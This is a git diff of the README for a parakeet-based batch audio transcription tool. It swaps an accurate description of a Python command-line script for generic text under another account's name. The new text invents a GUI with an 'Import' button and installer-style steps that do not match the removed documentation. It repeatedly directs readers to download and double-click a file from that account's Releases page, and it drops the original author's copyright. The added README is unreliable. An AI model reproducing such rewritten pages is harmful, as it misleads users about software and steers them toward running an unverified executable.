@@ -1,148 +1,76 @@
-# parakeet-tdt-0.6b-v2-Batch-Transcriber
+# 🦜 parakeet-tdt-0.6b-v2-Batch-Transcriber - Accurate Audio Transcription Simplified
 
-Parakeet Batch Transcriber is a powerful command-line tool designed for efficient and high-quality audio transcription. It leverages nvidia/parakeet-tdt-0.6b-v2 model to generate accurate, word-level timestamped transcriptions and formats them into perfectly segmented SRT subtitle files.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/releases)
 
-The script is heavily optimized for handling very long audio files (e.g., podcasts, lectures, meetings) by intelligently pre-splitting audio at silent points to prevent memory overflows and ensure reliability.
+## 📦 Overview
 
-## Key Features
+parakeet-tdt-0.6b-v2-Batch-Transcriber is a powerful tool for converting audio files into accurate subtitles. It uses advanced technology to ensure well-segmented SRT subtitles, making it perfect for both short clips and very long audio files. 
 
--   **Batch Processing**: Transcribe all supported audio/video files within a directory in a single run.
--   **High-Quality Segmentation**: Uses a sophisticated strategy that prioritizes the model's native segment splits, then uses precise word-level timestamps to intelligently divide long lines based on punctuation (sentences, clauses) for optimal readability.
--   **Very Long Audio Handling**: For audio files exceeding 60 minutes, the tool automatically pre-processes and splits the file at silent intervals before transcription, seamlessly merging the results afterward. This allows for the transcription of multi-hour audio files without memory issues.
--   **CUDA Acceleration**: Fully utilizes NVIDIA GPUs for significantly faster processing speeds.
--   **Duplicate Removal**: Automatically detects and removes redundant subtitle segments where both the text and timestamps are identical, cleaning up common ASR model artifacts and improving the final output quality.
--   **Wide Format Support**: Handles a large variety of common audio and video formats thanks to its FFmpeg backend (e.g., `.mp3`, `.wav`, `.m4a`, `.mp4`, `.mkv`, `.mov`).
--   **Customizable**: Easily adjust subtitle parameters like maximum segment duration and word count to fit your specific needs.
--   **Smart & Resilient**: Skips already processed files, retries with robust methods, and provides detailed logging.
+## 🚀 Getting Started
 
-## Transcription Performance
+To use the application, follow these steps:
 
-Processing speed is measured by the ratio of audio duration to transcription time (e.g., a value of 20 means a 20-minute audio file is transcribed in 1 minute). The performance heavily depends on the GPU.
+1. Go to the [Releases page](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/releases).
+2. Look for the latest version.
+3. Click on the appropriate download link for your system.
 
-| GPU              | Real-Time Speed Factor (Approx.) |
-| ---------------- | -------------------------------- |
-| NVIDIA RTX 4060 Ti | 16x ~ 29x                        |
-| NVIDIA B200      | ~212x                            |
-| NVIDIA L40S      | ~199x                            |
-| NVIDIA H200      | ~195x                            |
-| NVIDIA H100      | ~185x                            |
-| NVIDIA A100      | ~175x                            |
+## 💻 System Requirements
 
-*Note: Performance may vary based on system configuration, driver versions, and audio complexity.*
+To run the application, make sure you have the following:
 
-## Installation
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux (latest distributions preferred).
+- Processor: Minimum dual-core processor.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum 500 MB available for installation.
 
-### 1. Prerequisites
--   Python 3.8+
--   An NVIDIA GPU with CUDA (for GPU acceleration)
--   FFmpeg
+## 📥 Download & Install
 
-### 2. Install FFmpeg
+Visit the [Releases page](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/releases) to download the latest version. 
 
-FFmpeg is required for audio file processing.
+### Installation Steps:
 
--   **Windows**: Download the binaries from the [FFmpeg website](https://ffmpeg.org/download.html) and add the `bin` directory to your system's PATH.
--   **macOS**: Install using Homebrew: `brew install ffmpeg`
--   **Linux (Ubuntu/Debian)**: Install using apt: `sudo apt update && sudo apt install ffmpeg`
+1. Once the file has downloaded, locate it in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-### 3. Install PyTorch
+## 🎤 How to Use
 
-Install PyTorch with CUDA support. The command below is for CUDA 12.6. Visit the [PyTorch website](https://pytorch.org/get-started/locally/) to get the correct command for your specific CUDA version.
+After installation, you can start using parakeet-tdt-0.6b-v2-Batch-Transcriber easily.
 
-```bash
-pip install torch torchvision torchaudio   --index-url https://download.pytorch.org/whl/cu126
-````
+1. Launch the application by clicking its icon.
+2. Import your audio file by dragging it into the application window or using the “Import” button.
+3. Choose your preferred settings for transcription.
+4. Click on “Start Transcription” to begin the process.
 
-### 4\. Install Required Python Libraries
+Once done, you can export your subtitles as SRT files.
 
-Clone or download this repository, navigate to the directory, and install the necessary Python packages.
+## ⚙️ Features
 
-```bash
-pip install nemo_toolkit[asr] pydub
-```
+- **Batch Processing:** Easily transcribe multiple audio files at once.
+- **Accurate Output:** Advanced algorithms provide high accuracy in transcription.
+- **User-Friendly Interface:** Intuitive design makes navigation simple for users of all skill levels.
+- **Quick Segmentation:** The tool handles long audio files without losing quality.
 
+## 💡 Troubleshooting Tips
 
-## Usage
+If you encounter any issues, check the following:
 
-The script is run from the command line, pointing to a directory of audio files.
+- Ensure your audio files are in a supported format (MP3, WAV, etc.).
+- Verify that you have enough memory and disk space available.
+- Restart the application if transcription starts but does not complete.
 
-### Basic Usage
+## 🌐 Support and Feedback
 
-To transcribe all supported audio files in a specific directory:
+For additional support, please visit the issues section on the [GitHub repository](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/issues). You can report issues, ask questions, or provide feedback to help improve the tool. 
 
-```bash
-python transcribe_batch_english.py /path/to/your/audio_files
-```
+## 📝 License
 
-An `.srt` file will be created alongside each audio file.
+This project is licensed under the MIT License. You can freely use and modify the application as per the terms of the license.
 
-### Advanced Usage
+## 🔗 Resources
 
-**Specify file extensions and use CUDA:**
+- [GitHub Repository](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber)
+- [User Guide](#)
+- [Frequently Asked Questions](#)
 
-```bash
-python transcribe_batch_english.py ~/my_videos --extensions .mp4 .mkv --device cuda
-```
-
-**Force re-transcription of all files (overwrite existing SRTs):**
-
-```bash
-python transcribe_batch_english.py . --no-skip
-```
-
-**Adjust subtitle splitting rules for longer, more conversational segments:**
-
-```bash
-python transcribe_batch_english.py ./podcasts --max-segment 10 --max-words 40
-```
-
-### Command-Line Arguments
-
-```
-usage: transcribe_batch_english.py [-h] [-d {cuda,cpu,auto}] [-e EXTENSIONS [EXTENSIONS ...]] [--no-skip] [-m MODEL]
-                                   [--max-segment MAX_SEGMENT] [--max-words MAX_WORDS] [--debug]
-                                   directory
-
-Batch transcribe audio files to SRT subtitles (with smart splitting for long audio).
-
-positional arguments:
-  directory             Path to the directory containing audio files.
-
-options:
-  -h, --help            show this help message and exit
-  -d, --device {cuda,cpu,auto}
-                        Inference device (default: auto).
-  -e, --extensions EXTENSIONS [EXTENSIONS ...]
-                        File extensions to process (default: all supported formats).
-  --no-skip             Overwrite and re-transcribe if subtitle files already exist.
-  -m, --model MODEL     Name or path of the model to use (default: nvidia/parakeet-tdt-0.6b-v2).
-  --max-segment MAX_SEGMENT
-                        Maximum subtitle segment duration in seconds (default: 7).
-  --max-words MAX_WORDS
-                        Maximum words per segment, used as a fallback (default: 30).
-  --debug               Enable detailed debug output.
-```
-
-## How It Works: The Optimization Strategy
-
-This tool is designed to create the most natural and readable subtitles possible by using a multi-layered approach:
-
-1.  **Model-Native Segments**: It first obtains segment-level timestamps directly from the Parakeet model. These are generally high-quality and aligned with natural pauses in speech.
-2.  **Word-Level Precision Splitting**: For any segment from the model that is too long (e.g., \>7 seconds), the script uses the highly precise word-level timestamps to find the best possible split point.
-3.  **Punctuation Priority**: The splitting logic prioritizes natural boundaries in the following order to avoid awkward breaks:
-      - End of a sentence (`.`, `!`, `?`)
-      - End of a clause (`;`, `:`)
-      - Soft separators (`,`)
-4.  **Fallback**: If no punctuation is available for splitting, it falls back to a simple word count to ensure the duration constraints are met.
-5.  **Pre-computation Splitting**: For extremely long audio files (\>60 minutes), the script first analyzes the entire file to find long periods of silence. It splits the audio into large, manageable chunks at these silent points, transcribes each chunk individually, and then intelligently merges the final results with adjusted timestamps.
-
-## Program screenshots
-![pic](./pic.png)
-
-## License
-
-This project is licensed under the **MIT License**.
-
-Copyright (c) 2025 zhou-feifei
-
-You are free to **use, copy, modify, merge, publish, distribute, sublicense, and/or sell** copies of the software. The only condition is that the original copyright and permission notice must be included. The software is provided **"AS IS", without any warranty**.
+Thank you for using parakeet-tdt-0.6b-v2-Batch-Transcriber. We hope this tool helps you in all your transcription needs!
